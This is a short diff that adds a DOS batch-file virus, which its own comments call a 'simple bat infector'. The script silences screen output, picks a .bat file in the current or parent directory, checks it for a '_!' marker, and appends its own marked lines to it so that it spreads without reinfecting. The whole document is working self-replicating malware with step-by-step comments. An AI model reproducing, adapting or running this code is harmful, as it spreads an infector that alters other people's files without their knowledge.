@@ -1,0 +1,13 @@
+   ctty nul._!
+   : REM THIS TURNS OFF ALL SCREEN OUTPUT
+   for %%f in (*.bat ..\*.bat) do set _!=%%f
+   : REM FINDS A CANIDATE BAT FILE
+   find "_!"<<%_!%
+   : REM THIS LINE CHECKS FOR ANY _!
+   if errorlevel 1 find "_!"<%0.BAT>>%_!%
+   : REM IF _! IS FOUND THEN SKIP THIS IF NOT THEN BY
+   : REM FINDING ALL LINES WITH _! AND REDIRECTING THEM TO THE
+   : REM NEW HOST WE INFECT THE BAT FILE WHILE NOT REINFECTING
+   ctty con._!
+   :REM RETSTORES THE OUTPUT TO SCREEEN
+   : REM SIMPLE BAT INFECTOR
